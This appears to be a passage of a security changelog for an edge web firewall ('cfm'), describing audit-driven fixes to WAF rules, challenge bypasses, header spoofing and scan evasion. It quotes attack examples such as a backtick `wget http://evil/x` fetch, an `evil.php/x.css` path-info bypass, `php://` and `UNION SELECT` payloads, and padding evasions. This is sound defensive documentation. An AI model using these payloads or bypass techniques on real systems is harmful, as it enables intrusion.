- **WAF (rule 317, `WAF_CMD_PAYLOAD:PAY_BACKTICK`, challenge): fixed a dead
  backtick-RCE matcher that let most backtick command substitutions through.**
  The command allowlist was written `inner:match("^%s*(wget|curl|…)%f[^%a]")`,
  but **Lua patterns have no `(a|b|c)` alternation** — that group matched the
  literal string `wget|curl|…`, so it never fired. Only the adjacent
  `;`/`|`/`&&`-inside-backticks branch worked, so `` `wget http://evil/x` ``,
  `` `id` ``, `` `whoami` `` (no shell metachar) passed unchallenged. The leading
  token inside the backticks is now captured (`^%s*(%a+)`) and tested against a
  command set, so a full word must match exactly (`` `category` `` ≠ `cat`). It
  scans query args only, the search-field carve-out (q/s/term/search/query) is
  preserved, and the tier stays **challenge** (no block/ban). Covered by
  `scripts/tests/cfm_waf_backtick_smuggling_test.lua`. Found by the 2026-07 edge
  Lua audit (F05).
- **WAF / challenge excludes: the in-path (Lua) glob matcher now scopes `*`/`?`
  to a single path segment, matching the Go enforcement matcher.** The Lua
  `glob_to_lua_pattern` (`cfm_waf_excl.lua`) expanded `*`→`.*` and `?`→`.`, both
  of which cross a `/`, while the Go log-driven matcher (`globToRegex` in
  `exclude_store.go`) uses `[^/]*`/`[^/]`. So an operator exclude like
  `/wp-admin/*` switched the WAF (or challenge) **off in-path** for the entire
  `/wp-admin/a/b/c…` subtree, while the log-driven side only excluded direct
  children — a silent, one-sided widening of the WAF-off region onto unintended
  deep paths. Lua now emits `[^/]*`/`[^/]` too, so both engines agree. Hosts are
  unaffected (no `/`). To exclude a whole subtree, use a **non-glob path prefix**
  (`/wp-admin`), which already matches the subtree at a segment boundary.
  Behaviour change: an exclude relying on `*` to cross `/` in-path now stops at
  one segment (as it always did on the log-driven side). `[...]` bracket-class
  globs are still matched literally in Lua (Go treats them as a class) — a
  rarer, narrower-in-Lua consistency gap tracked as a follow-up. Covered by
  `scripts/tests/cfm_waf_excl_test.lua`. Found by the 2026-07 edge Lua audit (F10).
- **WAF (body-aware rules): a padded query string could evict the POST body from
  inspection (F09).** The shared normalized scan surface `get_norm_ab` built
  `cap(args .. "&" .. body, budget)` — with the attacker-controlled query string
  **first** and a single cap over the merge — so a query padded to the
  Content-Type body budget consumed the whole allowance and truncated the body
  away. Every body-aware detector that reads this surface (SQLi, `php_wrappers`,
  `ssrf`, `js_proto`, `log4shell`, `superglobal`, `c2_tunnel`) then missed a
  body-borne payload: e.g. `POST /?<8 KB of padding>` with a urlencoded body
  carrying `php://…` or a `UNION SELECT` was not inspected. `get_norm_ab` now
  caps args and body **independently** (each to the body budget) before the
  concat, so the body always gets its full allowance; the transient stays
  bounded to ~2×budget. The same independent-cap was applied to
  `detect_crlf_injection` (rule 605, which builds its own args+body scan
  surface) and to the detector-internal fallback scan strings, so no divergent
  copy of the pattern remains. Covered by
  `scripts/tests/cfm_waf_body_budget_test.lua` (Test 9 — urlencoded/JSON budgets,
  `php_wrappers`/SQLi/CRLF paths, verified to fail on the old single-cap form).
  Found by the 2026-07 edge Lua audit (F09).
- **WAF/challenge bypass via PHP path-info on the static-asset fast path (F06).**
  The edge static-asset `location ~*` regex matched the URL *suffix*
  (`\.(css|js|woff|…|map)$`), not the file Apache actually serves, and runs
  `access_by_lua_block { return; }` — skipping `cfm.lua` (WAF **and** challenge)
  entirely. So `GET /uploads/evil.php/x.css` matched the `.css` bypass yet, under
  `cgi.fix_pathinfo`, executed `evil.php` at the origin with the edge inspection
  disabled. All four bypass locations (OpenResty + Angie, HTTP + HTTPS) now anchor
  the regex with a PHP-scoped negative-lookahead —
  `^(?!.*\.(?:phtml|pht|php[0-9]|php|phar)/).*\.(?:css|js|…|map)$` — so any URL
  with a `.php…/` (or `.phtml/`/`.pht/`/`.php5/`/`.phar/`) segment falls through to
  `cfm.lua` and is inspected again. This closes the universal `cgi.fix_pathinfo`
  `.php/` vector (which executes regardless of Apache handler style). Genuine
  static is unaffected, including `?v=` cache-busters (nginx matches the location
  against `$uri`, which excludes the query) and legitimately-named `foo.php.css`.
  Scoped to the PHP suffix family by design: multi-extension names
  (`/evil.php.jpg/…`, executable only under the legacy `AddHandler` form, not
  modern EA4 `<FilesMatch \.php$>`) and non-PHP handlers (`.cgi`/`.pl`/`.py`/
  `.shtml`) stay on the fast path — narrower residuals still covered by the
  log-driven behavioural engine. Verified by PCRE case matrix, `nginx -t`, live
  nginx routing (incl. `%2f` encoded-slash, which nginx decodes into `$uri`
  before location matching, so it is not evadable), and an adversarial review.
  Found by the 2026-07 edge Lua audit (F06).
- **Account-transfer tunnel: source-IP spoofing via client-supplied
  X-Forwarded-For (F03).** The raw TCP tunnel that carries WHM live-transfer
  rsync/dsync streams (`/acctxferrsync`, `/acctxferdsync`) replayed the client's
  headers to loopback cpsrvd and only injected `X-Forwarded-For`/`X-Real-IP`/
  `CF-Connecting-IP` **if the client hadn't already sent one** — so a
  client-supplied value passed through verbatim. cpsrvd's Apache trusts
  X-Forwarded-For from loopback (mod_remoteip), and the tunnel runs with the
  challenge/WAF bypassed on an internet-facing panel port, so an attacker could
  forge their apparent source IP into cpsrvd's audit log, cPhulk brute-force
  tracking, and IP allow/deny logic (e.g. impersonate a cPhulk-allowlisted IP,
  or frame an arbitrary one). Every other panel path already overwrites these
  with `$remote_addr`; this tunnel was the gap. It now takes sole authority over
  the forwarding/real-IP header set: it strips **every** client-supplied
  `X-Real-IP`/`X-Forwarded-For`/`X-Forwarded-Host`/`X-Forwarded-Port`/
  `X-Forwarded-Proto`/`X-Forwarded-Server`/`CF-Connecting-IP` (case-insensitively)
  and re-injects trusted values from `$remote_addr`, exactly mirroring the
  sibling `proxy_set_header … $remote_addr` blocks. Obsolete line folding
  (RFC 7230 §3.2.4) is dropped wholesale so a spoofed header can't ride in as a
  fold of a benign one. This is a no-op for legitimate transfers
  (`whm_xfer_download-ssl` never sends these headers, nor folds any); only a
  forged header/fold is dropped. Covered by
  `scripts/tests/cfm_panel_tunnel_xff_test.lua` (runs the real tunnel over
  stubbed cosockets and asserts on the exact upstream header block; verified to
  fail against the pre-fix file). Found by the 2026-07 edge Lua audit (F03).

### Fixed
- **A missing bridge token no longer 500s every request (F47).** When the bridge
  auth token file was absent (e.g. a reboot where nginx starts before the cfm
  daemon writes it), `cfm.lua` raised `error()` at chunk top level — and because
  `access_by_lua_file` re-runs the chunk per request, that returned **HTTP 500
  for every request** until the daemon started. Yet a present-but-unreachable
  daemon fails **open** — so identical "can't reach the daemon" conditions
  produced opposite outcomes based only on token-file presence (and this is the
  one failure mode the DNAT `__ssl_debug` health check can't detect, since the
  edge is up). The missing-token case now flows through the **same policy as an
  unreachable daemon**: `get_decision` serves cached clean-allows first, then
  fails through `fail_decision` (allow under the default `CFG.fail_open`, block if
  fail-closed) without the pointless auth-less RPC. It's logged loudly at ERROR
  ("FAILING OPEN — requests pass without bridge enforcement", with the token
  path), throttled to once/60s across workers so a prolonged outage can't flood
  the log. Recovers on its own once the daemon writes the token. Chosen to never
  interrupt service during restarts/maintenance. Because the bridge token is also
  the clearance HMAC secret, `cfm_clearance.validate()` was hardened to fail
  **closed** on a nil/empty secret (mirroring `mint`) — otherwise the now-reachable
  empty-secret state computes a publicly-forgeable empty-key HMAC, letting an
  attacker forge a clearance during the window (block-tier WAF still blocks
  regardless). Found by the 2026-07 edge Lua audit (F47, low).
- **Decision cache key now hashes the full request path (F38).** `get_decision`
  built the per-URL `cfm_decisions` cache key from `uri:sub(1, 64)`, so two paths
  sharing a 64-byte prefix mapped to one entry — and since only clean allows are
  cached, an attacker could warm the cache with a benign same-prefix request and
  reuse the `allow` for a longer path whose per-path bridge rule would
  challenge/block (the bridge is never consulted for the second path). The key now
  hashes the **full decoded path** with `ngx.md5`, so distinct paths never
  collide, while the key stays bounded (a path can be kilobytes). The query string
  is intentionally excluded — it isn't sent to the decision bridge, so a verdict
  can't depend on it. The per-URL key is now also keyed on `scope` (matching the
  static-asset branch), so a scoped verdict is never reused cross-scope. The key
  construction is extracted into a `decision_cache_key` helper (unit-tested).
  Found by the 2026-07 edge Lua audit (F38, low).
- **WAF-hit push cooldown now bounds scanner floods without masking autoblocks
  (F31).** `should_push` dedups the per-hit `cfm.waf.log` record + `ip_push` RPC
  using an shdict `:add`, but keyed on the **full reason** — and scored rules append
  a per-request `:score=N` (and a per-hit tag), e.g. `WAF_BAD_UA:<tag>:score=6`. So a
  scanner sweeping many URIs from one IP produced a different key per hit, escaping
  the 60s cooldown entirely and emitting one log record + one RPC **per hit** —
  exactly under the flood the cooldown targets. The cooldown now keys on
  `(ip, reason family, action tier)`: the **family** (before the first `:`, the same
  identity `WAF_HIGH_RISK_REASONS` uses) drops the volatile score/tag suffix, and the
  **action tier** is kept because WAF families mix enforcement tiers (e.g. `WAF_RCE`
  = block rule 320 + logonly 322-327) and the Go autoblock feeds on `action=block`
  pushes only — a family-only key would let a cheap logonly recon hit consume the
  window and suppress a later block hit's push, so the IP would never be autoblocked
  (an under-report / evasion primitive, caught in review). Same-tier score/tag floods
  still collapse to one push; the first push of each tier carries the full reason.
  Found by the 2026-07 edge Lua audit (F31, low).
- **Clearance host-binding no longer mangles IPv6-literal Hosts (F40).**
  `cfm_clearance`'s `normalize_host` stripped a trailing `:<digits>` as if always
  a port (`h:gsub(":%d+$","")`), so an **unbracketed** IPv6 literal lost its final
  hextet (`2001:db8::1` → `2001:db8:`) and brackets were never unwrapped — distinct
  IPv6 hosts collapsed to one value, so a clearance minted for `2001:db8::1` was
  accepted on the adjacent `2001:db8::2` (weakened host binding; not a full bypass
  since both sides re-normalize, but it diverged from the Go normalizer). Rewrote
  it to mirror Go's `normalizeClearanceHost`: unwrap `[ … ]`, strip a port only for
  a bracketed literal or a single-colon `host:port`, and leave an unbracketed
  literal (≥2 colons) intact. The Lua test mirrors the Go `TestNormalizeClearanceHost`
  cases verbatim to keep the server-minted and Lua-validated host in lockstep.
  IPv6-literal Host headers are rare on shared hosting, so real exposure was low.
  Found by the 2026-07 edge Lua audit (F40, low).
- **cfm_geo now self-heals after a transient MaxMind DB open failure (F46).**
  On the first per-worker lookup, an `mmdb.init`/`mmdb.new` failure set
  `_geo_api_mode = "disabled"` **permanently** for the worker's life — `country()`
  returned `""` for every later request with no retry until a proxy reload. A
  GeoLite2 update replaces the `.mmdb` via atomic rename, so a worker running its
  once-per-worker init during that swap window got a transient open error and
  geo stayed off indefinitely (`""` is fail-open for country blocklists but
  **fail-closed for allowlists**, so a worker could silently stop enforcing an
  allowlist with no self-recovery). Now a transient open/init failure keeps the
  backend mode and retries after a `GEO_INIT_RETRY_SEC` (30s) cooldown, so a later
  good DB is picked up automatically. The retry only runs while init has failed
  (a failed open creates no mapping) and stops permanently on first success, so it
  can't reintroduce the mmap accumulation this module exists to prevent. Applies
  to both the `init_lookup` and `new_object` backends. The load-time "unsupported
  library" disabled state (a genuinely permanent condition) is unchanged. Found by
  the 2026-07 edge Lua audit (F46, low).
- **WAF C2-tunnel host matching no longer false-positives on longer hostnames
  (F36).** `detect_c2_tunnel` (rule 702 `WAF_C2:TUNNEL`) matched its host tokens
  with a plain substring, so the short token `ix.io/` matched any longer hostname
  ending in it — `matrix.io/`, `phoenix.io/`, `citrix.io/` — tagging benign
  traffic as C2. The rule is at **`challenge`** (the detector comment's "ships at
  logonly" was stale — corrected), so these were **real user-facing challenges**
  on anyone referencing e.g. a Matrix homeserver URL, not just log noise. Every
  host token is now anchored on a `%f[%w]` left host boundary (a URL host start is
  always preceded by `//`, `.`, `@`, a delimiter, or the string start — never an
  alphanumeric), kept behind the existing cheap substring precheck so the hot path
  is unchanged; no real C2 URL is lost. Found by the 2026-07 edge Lua audit
  (F36, low).
- **Origin-keepalive no longer logs a false "OpenResty too old" NOTICE on a
  hostless request (F60).** `cfm_origin_ka.balance(443)` conflated two conditions
  in one `elseif`: genuinely lacking SNI-keyed pool support (`sni_pool_ok=false`)
  vs. a fully-capable worker handling a request whose `$host` resolved to `""`
  (e.g. `server_name '_'` with no Host). The empty-host case wrongly logged
  `lua-resty-core lacks SNI-keyed connection pools (needs OpenResty 1.27.1.1+)`
  and **burned the once-per-worker NOTICE latch** — so operators who grep
  `[cfm_origin_ka]` after enabling keepalive (as the docs instruct) wrongly
  concluded HTTPS origin pooling was disabled fleet-wide. The conditions are now
  split: the "no support" NOTICE fires only when `sni_pool_ok` is false; a
  hostless request on a capable worker is served unpooled **silently**, without
  the NOTICE and without consuming the latch. Behaviour is otherwise unchanged
  (still unpooled per-request for that hostless request). Found by the 2026-07
  edge Lua audit (F60, low).
- **Bounded line length in the core log readers too (F26 family).** The same
  unbounded `bufio.ReadString('\n')` fixed for the ingest socket (F26) also lived
  in **all three** `internal/detectors/core` log readers: the **file tailer**
  (`source.go`, reading the access log — its `ErrBufferFull` drain branch was
  **dead code**, since `ReadString` never returns that error), the **docker-logs**
  reader (`docker.go`) and the **journald** reader (`journal.go`). Each could OOM
  the daemon on a single oversized line from its source (a crafted access-log
  line, a compromised container's stdout, a journald record). All three now read
  with `ReadSlice`, which caps each read at the 256 KB buffer and drops an
  over-long line, resyncing at the next newline: `source.go` in place (making its
  existing drain live, advancing the file offset past the dropped line so resume
  skips it); `docker.go`/`journal.go` via a shared `readBoundedLine` helper that
  errors past an 8 MB drain cap rather than reading a never-terminated line
  forever. Discovered while fixing F26; the original finding wrongly assumed the
  file tailer was already bounded.
- **Ingest socket now bounds line length (F26).** `webdetector`'s Unix ingest
  socket (`/run/cfm/ingest.sock`, `root:cfm 0660`, fed by `log-cfm.lua`) read
  lines with `bufio.ReadString('\n')`, whose comment wrongly claimed a 256 KB
  bound. `ReadString`/`ReadBytes` accumulate an un-delimited stream **without
  bound** (the reader buffer only limits a single fill), so any cfm-group sender —
  a compromised or simply buggy worker — could stream newline-free data and OOM
  the daemon. The reader now uses `ReadSlice`, which returns `ErrBufferFull` past
  the 256 KB buffer; an oversized line is dropped and ingestion resyncs at the
  next newline (memory bounded, connection kept alive), and a single line that
  floods past 8 MB closes the connection. Dropped oversized lines are counted and
  logged (throttled). Found by the 2026-07 edge Lua audit (F26). _(The file
  tailer `internal/detectors/core/source.go` has the same latent `ReadString`
  pattern with dead `ErrBufferFull` handling — tracked separately.)_
- **ClamAV upload scan no longer blinded by a padded multipart body (F17).** The
  Lua ClamAV lane decided whether a multipart POST carried a file to scan by
  substring-matching `filename=` in `ngx.ctx.waf_body` — the WAF's first
  `waf_body_max_len` bytes (32 KB), which is also **absent** when the WAF skipped
  the body read (a body over its Content-Length gate). An attacker could prepend a
  large non-file form field so the `filename=` landed **past the cap**, making
  `has_file_part()` return false and the upload evade the AV scan entirely (the
  Go bridge scans whatever body file it's handed, so the whole gate lived in Lua).
  The decision (`wants_scan`) now **fails safe**: if the inspected view shows no
  file part but the real body has bytes beyond it (nginx spooled it to disk),
  scan anyway — the scan always covers the full spooled body, so a file part
  beyond the cap is still caught. A genuinely small, fully-inspected multipart
  with no `filename=` still stays in the WAF lane only (no wasted scan), so the
  "scan only real uploads" resource posture is preserved for common
  admin-ajax/FormData. Normal uploads (file field first, `filename=` in the first
  bytes) already hit the fast path and are unchanged, but this **does** add new
  scans on file-hosting boxes: the padding-evasion case, large non-file multipart,
  and — a coverage gain — uploads the WAF skipped entirely (body over its 1 MB
  Content-Length gate, or chunked) that were **never** scanned before. Each spooled
  scan copies the full body first, so watch ClamAV load after upgrade; a body-size
  cap before enqueue is a sensible follow-up (there is none today). The `filename=`
  match is now fully case-insensitive (`FILENAME=`/`FileName=`), closing a small
  in-memory evasion. Found by the 2026-07 edge Lua audit (F17).
- **Revived the dead base64 PHP-object-injection WAF sub-rule (F13, rule 304).**
  The `B64_OBJ_INJECT` check in the base64 POST-body scanner tested a Lua
  `%bo%:%d+%:"` / `%bc%:%d+%:"` pattern. Lua's `%b` takes the **two bytes after
  it** as balanced delimiters, so `%bo%` asked for a balanced `o`…`%` run — and a
  decoded serialized object (`o:8:"stdclass"`) contains no `%`, so the sub-rule
  matched nothing and was **effectively off**. It now matches frontier-anchored
  serialized-object headers `o:<len>:"` / `c:<len>:"` (objects and custom-serialized
  objects; **not** `a:<len>:{` arrays — legit payloads carry arrays and only object
  `unserialize()` triggers POP chains). The `%f[%a]` frontier requires the marker
  to **start a token**, so a word ending in o/c like `foo:12:"bar"` can't
  false-match. Because this sub-rule was dead, reviving it straight into rule 304's
  `challenge` tier could FP-challenge apps that `base64(serialize($obj))` into a
  POST body, so `B64_OBJ_INJECT` **burns in at `logonly`** (visibility, no
  enforcement) — a per-tag split mirroring the F11 rule-438 burn-in; promote to
  `challenge` after watching the hit-rates. To keep that lower tier from being
  abused, the object tag is a **deferred, lowest-priority fallback** in the
  detector: a hostile sibling (`eval(`/`system(`/`union select`/…) anywhere in the
  body — same candidate or a later one — always wins first and keeps rule 304's
  configured tier, so an attacker cannot prepend a serialized-object marker to
  downgrade a base64'd `system()`/`union select` from challenge/block to logonly.
  Found by the 2026-07 edge Lua audit (F13).
- **sslcollector socket now self-heals and no longer orphans itself on restart
  (F27/F28).** The unix socket that serves TLS cert+key material to the edge
  workers had two latent ways to go silently down for the daemon's life — on a
  DNAT'd edge that means workers fall back to stale-snapshot or self-signed
  certs. **(F28, self-heal):** if `ServeSock` returned any error — most
  realistically a **transient bind failure at startup** (a stale socket, a
  not-yet-ready parent dir, `EADDRINUSE`) — the goroutine just logged and exited,
  but the lifecycle's no-change guard still saw `cancel != nil` and early-returned
  on every later tick, so the socket was **never respawned**. The guard now keys
  on actual liveness, and an unexpected exit is respawned on a later tick with
  bounded exponential backoff (5s→5m, reset on a healthy tick; a config change is
  never throttled). **(F27, restart race):** `net.Listen("unix")` defaults
  `UnlinkOnClose=true`, so during a config-change restart the *old* listener's
  `Close()` could `unlink()` the **new** listener's socket by name (if the new
  bind won the race), leaving the new server listening on an fd with no
  filesystem entry — every worker dial got `ENOENT` until the next restart. The
  listener now sets `SetUnlinkOnClose(false)` (the existing `os.Remove` owns
  stale-file cleanup; disable/shutdown remove the name explicitly). The lifecycle
  state machine is now mutex-guarded and race-clean under `go test -race`. Found
  by the 2026-07 edge Lua/OpenResty audit (F27, F28).
- **sslcollector generated-Lua token files are now crash-durable and always
  valid LuaJIT (F54/F55).** The generated `cfm_token.lua` / `cfm_bridge_token.lua`
  authenticate the edge workers to the collector and bridge sockets; a bad file
  → 403 on every `/cert` and `/dumpall` → cert-delivery outage. **(F54,
  durability):** the shared atomic Lua-file writer did `WriteFile(tmp)` + `rename`
  with **no `fsync`**, so power loss between the rename becoming durable and the
  data reaching disk could leave a present-but-empty/truncated token file after
  reboot. It now `fsync`s the temp file before the rename (matching the snapshot
  writer) — fixing durability for all four generated Lua files (token,
  sslcollector-config, clamav-config, bridge-config) at once, since they share
  this writer. **(F55, valid LuaJIT):** an operator-supplied token was accepted
  verbatim if ≥32 chars and emitted via Go `%q`; a non-printable non-ASCII rune
  (e.g. a pasted zero-width space) renders as `\uXXXX`, which LuaJIT cannot parse
  → the token file fails to compile and edge↔collector/bridge auth breaks. Tokens
  are now required to be graphical ASCII (`0x21–0x7e`); a token that isn't is
  treated as weak and regenerated (the generated 48-hex token is always safe).
  Applied to both the sock token and the generic key form (`OPENRESTY_TOKEN`,
  which is itself emitted to `cfm_bridge_token.lua`). Found by the 2026-07 edge
  Lua/OpenResty audit (F54, F55).
- **sslcollector TLS handshake hot path: cache parsed certs + rate-limit the
  cache-miss log (F19/F43).** `ssl_certificate_by_lua` runs on every full TLS
  handshake. **(F19, perf):** the worker cert store held raw PEM, so `set_cert`
  called `parse_pem_cert` + `parse_pem_priv_key` (PEM→DER + key parse — one of
  the costliest per-handshake ops) on *every* connection, even though certs
  change ~hourly. The PEM is now parsed once at ingest (`store_pair`) and the DER
  cdata cached on the entry; the handshake path just reuses it. A cert that won't
  parse is dropped at ingest (logged once) instead of re-failing per handshake.
  **(F43, DoS):** every unmatched SNI logged one synchronous `error_log` WARN,
  with no throttle — an attacker opening TLS connections with random SNIs could
  fill the disk / contend I/O on the handshake path. The miss log is now
  worker-rate-limited (≤1 line per 10s, with a coalesced suppressed count), and
  the attacker-supplied SNI is length-bounded + sanitized on the logged line.
  Cert selection still fails safe to the static default cert. Found by the 2026-07
  edge Lua/OpenResty audit (F19, F43).
- **DNAT/panel scoped accepts were appended AFTER the default drop (and
  duplicated) — DNAT'd web/panel traffic was dropped unless the listener ports
  were in `TCP_IN`.** `ensureScopedDNATAccepts` / `EnsurePanelDNATAccepts` (nft
  backend) listed the input chain with `nftOut("-a list chain inet cfm input")`,
  but `nftOut` feeds its argument to `nft -f -` (script mode) where the `-a`
  handle flag is a **syntax error**. The listing therefore failed and the error
  was discarded, so: (1) the default-drop handle was never found and the scoped
  `ct status dnat` accepts were **appended after** the drop (never matched), and
  (2) the "does this accept already exist" cleanup matched nothing and **piled
  up duplicate** accept rules on every reload. Net effect on cPanel/Imunify boxes
  with `cfm dnat on` / `cfm dnat cpanel on`: only allowlisted (`allow_dyn`) IPs
  could reach the site; everyone else was dropped — masked only by listing
  `9080/9043/12082..` in `TCP_IN`. Fixed by listing via `ListChainText` (argv
  mode) in all five affected call sites (`ensureScopedDNATAccepts`,
  `cleanupScopedDNATAccepts`, `EnsurePanelDNATAccepts`, `RemovePanelDNATAccepts`,
  `PanelDNATAcceptState`) and failing closed on a list error instead of silently
  appending. You no longer need the DNAT listener ports in `TCP_IN`. Regression
  tests: `TestDNATOnPlacesAcceptsBeforeDefaultDrop` (live-nft, gated by
  `CFM_NFT_INTEGRATION=1`) and `TestNftOutIsNeverCalledWithCLIFlags` (source
  guard). Review hardening on the same change: `nftOut` now rejects a
  leading-dash arg at runtime (the flag-in-script-mode footgun that caused the
  bug); the default-drop matcher and the redirect-port parser were consolidated
  into `internal/firewall/dnat_accepts.go` (single source of truth for the nft
  backend and the dnat CLI, previously copy-pasted in 3-4 spots); `cfm dnat`
  status now resolves accepts against the ports actually installed in
  `cfm_redirect` (not the CLI/env default) so a custom-port box no longer shows
  false `ABSENT`; and `PanelDNATAcceptState` became placement-aware (an accept
  stranded after the drop reports `blocked`, not `open`).
- **Socket-ingest-only boxes: forced-vhost challenge (and all webdetector
  challenge/block emission) never ran.** When the webdetector ingests via the
  Unix socket (`/run/cfm/ingest.sock`, fed by the OpenResty/Angie edge) and the
  configured `LOG_PATH` file does not exist, `webdetector_register` never
  attaches a file source, so `Engine.src` is nil. `RunOnce` returned at its
  `if e.src == nil { return nil }` guard **before** the periodic reconcile —
  and that reconcile (`emitIPChallenges` / `emitIPBlocks`) is the *only* place
  the `CHALLENGE_VHOST` list, per-IP challenges, and autoblocks are pushed to
  the edge. Net effect on a socket-only server: the forced list loaded fine but
  `/nginx/status` showed `active_vhosts: []` and `cpanel.*`/`webmail.*`/`whm.*`
  were never challenged, even though scoring/history (socket-fed) and the
  in-path WAF (independent) both worked — so it looked like a config mistake.
  `RunOnce` now drains the file source only when one is attached and **always**
  runs the reconcile, so the socket is a first-class standalone source (as it
  already is for `cfm webtop` and the WAF). A transient `Open()` failure (e.g. a
  log mid-rotation) likewise no longer skips the reconcile — but the tail
  resume-offset is now persisted **only after a clean drain** (`srcDrained`
  guard), so an Open/read failure can't overwrite the saved offset with a
  zeroed `Position()` and make recovery seek-to-end and skip lines. Regression
  tests: `TestRunOnce_SocketOnlyStillPushesForcedVhosts`,
  `TestRunOnce_OpenFailureDoesNotClobberSavedOffset`. Workaround on older
  builds: `touch` the `LOG_PATH` file so a source attaches.

### Changed
- **WAF: the three SQLi rules share one SQL-comment strip per scan surface
  (F30b).** `detect_sqli`, `detect_sqli_blind_lexical` and
  `detect_sqli_union_variant` each independently recomputed `sqli_scan_strings`
  (`strip_sql_comments` + a `+`/whitespace collapse) on the same scan string —
  3× per surface, and the engine scans both the URI+query and args+body
  surfaces, so **6× per request**. The comment-strip pair is now computed by two
  memoized engine getters (`get_sqli_ua` / `get_sqli_ab`, mirroring the existing
  `get_scan_ua`/`get_norm_ab` memoization) and passed into the detectors, which
  take the `(sc, scw)` pair directly — **2 strips per request instead of 6**
  (1 for a body-less GET). Saves ~1.1 ms/req (~8.5%) on a large ~8KB URI+body
  SQLi surface; negligible on normal short requests. Detection is byte-identical
  (the strings are the same, just computed once). Follow-up to F30, which
  widened the scan surface and made the redundancy more visible. Found by the
  2026-07 edge Lua audit (F30b, low).
- **UA-emergency: move the periodic rule-file read off the request hot path (F48).**
  `cfm_ua_emergency.check()` runs on every request and called `refresh_if_needed()`,
  which every `REFRESH_INTERVAL_SEC` (3s) per worker did a blocking `io.open` +
  full `read` + string-compare of `/var/lib/cfm/ua_emergency.json` **in the access
  phase** — and the module header falsely claimed it stat'd mtime (it does a
  content compare; Lua has no stat without `lfs`). The first load per worker is
  still synchronous (so the very first request is checked against any emergency
  rules — no cold-start bypass on this security surface), but every later refresh
  now runs in a background `ngx.timer.at(0)` (the `cfm_h3_config` pattern) while the
  request keeps serving the current in-memory rules; a dedupe flag stops concurrent
  requests from stacking timers. Convergence latency is unchanged (≤ 3s across the
  pool). The misleading comment is corrected. Found by the 2026-07 edge Lua audit
  (F48).
- **WAF: cache the exclude glob→pattern conversion per rule (F32).** For every
  glob exclude row (`*`/`?`), `matches_rule` rebuilt the anchored Lua pattern (two
  gsubs over the rule) on every WAF-eligible request — once per host row and once
  per path row — where Go compiles its regexp once at rebuild. `glob_to_lua_pattern`
  now caches the pattern in a module-scope table keyed by the rule string. The keys
  are exclude **rules** (a bounded operator list), never request values, so the
  cache can't grow with traffic; it persists per worker and is naturally superseded
  when a rule changes (a changed rule is a new key). Behavior-neutral — the
  conversion is a pure function of the rule, so a cache hit returns a byte-identical
  pattern. Found by the 2026-07 edge Lua audit (F32).
- **WAF: memoize the per-request args-normalize and body-lowercase once, shared
  across detectors (F58 + F59).** Each WAF request re-did the same string work in
  several detectors: `normalize(cap(args, max_scan_len))` (double-URL-decode +
  lowercase) was recomputed by `detect_cmd_param_key`/`cmd_payload`/
  `debug_toggles`/`php_serialize`/`bad_utf8` (F58), and `lower(cap(body,
  max_scan_len))` was rebuilt by the five RCE-marker detectors
  (`reverse_shell`/`persistence`/`rootkit_artifacts`/`lolbin`/`coinminer`, F59) —
  up to ~6× and 5× the necessary allocations over the same strings on every
  request. `cfm_waf.lua`'s `check` now computes each once via lazy getters
  (`get_norm_args()` / `get_body_lc()`, mirroring the existing
  `get_scan_ua()`/`get_norm_ab()` memos) and passes them into those detectors,
  which use the precomputed value when given and fall back to computing it
  otherwise. Behavior-neutral by construction — the memo is byte-identical to
  each detector's own computation (same `CFG.max_scan_len`), so results are
  unchanged; only the redundant recomputation is removed. Found by the 2026-07
  edge Lua audit (F58, F59).
- **WAF: skip the xmlrpc legit-check normalize on non-xmlrpc requests (F24).**
  `is_known_legit_xmlrpc` (the Jetpack carve-out, called on the WAF hot path for
  every request via `cfm_waf.lua` sections 26 & 28) normalized both the args and
  the body — a double-URL-decode + lowercase + cap — **before** checking whether
  the URI was even `/xmlrpc.php`, wasting that work on the ~99% of requests that
  aren't xmlrpc. The `/xmlrpc.php` URI gate now runs first, short-circuiting
  before the normalize. Pure reordering — identical result for every request,
  just cheaper on the common path. Found by the 2026-07 edge Lua audit (F24).
- **`cfm dnat` now reports the scoped listener-port accepts (web scope).**
  `cfm dnat on` DNATs `80→:9080` / `443→:9043` and installs scoped
  `ct status dnat` accepts in `inet cfm/input` so the redirected traffic reaches
  the edge **without** `9080/9043` in `TCP_IN` — but the web path did this
  silently, so an operator whose site was unreachable after `cfm dnat on` had no
  way to tell a missing CFM accept from an upstream drop. `cfm dnat on` now
  prints a `Firewall: opened scoped 80->9080 tcp (nft cfm/input)` line per mapping
  (parity with `cfm dnat cpanel on`) and warns loudly when a mapping is absent or
  landed after the default drop; `cfm dnat` status gains a **Scoped DNAT
  accepts** block reporting each mapping as `open` / `BLOCKED` / `ABSENT`. When
  all read `open` but a non-allowlisted client still can't connect, the drop is
  upstream (external CSF/Imunify `INPUT` filtering the listener port, or an edge
  bound to `127.0.0.1` only) — see `docs/dnat-bypass.md`. No change to the
  firewall rules themselves.
- **Reference `detectors.conf` ships a sane cPanel forced-challenge default and
  drops leaked customer hosts.** `CHALLENGE_VHOST` now defaults to
  `webmail.*, whm.*, cpanel.*` (force-challenge the cPanel/WHM/webmail service
  subdomains — high-value on cPanel boxes, inert elsewhere) instead of the
  `victim.com` placeholder. `CHALLENGE_VHOST_IGNORE` / `CHALLENGE_HOST_BYPASS`
  are now **empty** — the shipped reference previously carried real
  customer/operator hostnames (`api.mybank.gr`, `stereotiki.gr`, `ndnodo.com`,
  `*.e-nautilia.gr`, …), which would apply one operator's exclusions/bypasses on
  every install. These are operator-specific and must be set per host.

### Added
- **`cfm health` edge section: TSV access-log and origin real-IP visibility.**
  Two new read-only lines under "Web stack - Edge Interceptor", to make a fresh
  edge setup self-diagnosing:
  - **TSV access log** — reads `[webdetector] LOG_PATH`, then reports whether the
    file exists and is *filling* (write-recency + size shown as context only —
    the file's mtime is the producer's signal, not the ingest consumer's health,
    so a quiet vhost that writes nothing is never flagged). It warns only on
    unambiguous faults: the path is not a regular file, or it is absent while the
    ingest socket is also not live (no ingest source wired at all). Never
    false-alarms on socket-only or idle boxes.
  - **Origin real-IP** — detects the origin stack (Apache / LiteSpeed / nginx,
    cPanel + DirectAdmin/plain paths) and checks that 127.0.0.1 is trusted as a
    real-IP proxy (`RemoteIP{Internal,Trusted}Proxy` for Apache, LiteSpeed's
    native `useIpInProxyHeader`, `set_real_ip_from` for nginx). Warns — with the
    concrete consequence ("access logs will record 127.0.0.1, not client IPs")
    — when the trust directive is missing. Purely diagnostic; changes nothing.
    The stack is resolved from on-disk install markers, not blindly from the
    collector's upstream hint, so an OpenResty box (the edge is nginx-based) is
    no longer misreported as an "nginx" origin when the real origin is LiteSpeed
